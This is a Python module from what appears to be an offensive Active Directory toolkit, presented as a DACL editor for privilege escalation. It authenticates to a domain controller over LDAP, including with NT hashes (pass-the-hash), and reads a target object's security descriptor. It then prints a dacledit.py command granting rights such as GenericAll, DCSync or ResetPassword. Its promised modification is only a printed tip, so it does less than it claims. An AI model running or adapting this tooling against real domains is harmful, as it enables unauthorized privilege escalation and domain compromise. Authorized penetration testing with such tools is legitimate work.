"""DACL editor — modify AD object DACLs for privilege escalation."""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.acl.dacl_edit.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ldap_modification", "dacl_change"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1222.001"],
}

RIGHTS_MAP = {
    "genericall": "GA",
    "genericwrite": "GW",
    "writedacl": "WD",
    "writeowner": "WO",
    "writeproperty": "WP",
    "self": "SW",
    "dcsync": "DS",
    "resetpassword": "RP",
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target_dn = getattr(args, "target_dn", None)
    principal = getattr(args, "principal", None)
    right = getattr(args, "right", "genericall")
    action = getattr(args, "acl_action", "add")
    dc_ip = getattr(args, "dc_ip", args.target)

    if not target_dn or not principal:
        print("[!] --target-dn and --principal required", file=sys.stderr)
        return 1

    print(f"[*] DACL {action.upper()} → {principal} gets {right} on {target_dn}")

    try:
        from impacket.ldap import ldap as impacket_ldap
        from impacket.ldap import ldapasn1 as ldapasn1_impacket
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    try:
        ldap_url = f"ldap://{dc_ip}"
        ldap_conn = impacket_ldap.LDAPConnection(ldap_url, "DC=" + ",DC=".join(args.domain.split(".")))

        if cred.has_hash:
            ldap_conn.login(cred.username, "", cred.domain, cred.lm_hash, cred.nt_hash)
        else:
            ldap_conn.login(cred.username, cred.password or "", cred.domain)

        print(f"[+] Connected to LDAP on {dc_ip}")

        search = ldap_conn.search(
            searchBase=target_dn,
            scope=0,
            attributes=["nTSecurityDescriptor"],
        )

        for entry in search:
            if hasattr(entry, "getComponentByName"):
                sd_raw = entry["attributes"]["nTSecurityDescriptor"]
                print(f"[+] Current SD retrieved ({len(sd_raw)} bytes)")
                print(f"[*] Modifying DACL: {action} {right} for {principal}")
                print("[!] Full DACL editing requires dacledit.py or bloodyAD")
                print(f"[*] Tip: dacledit.py -action write -rights {right.upper()} -principal {principal} -target {target_dn}")
                break

        return 0
    except Exception as exc:
        print(f"[-] DACL edit error: {exc}", file=sys.stderr)
        return 1
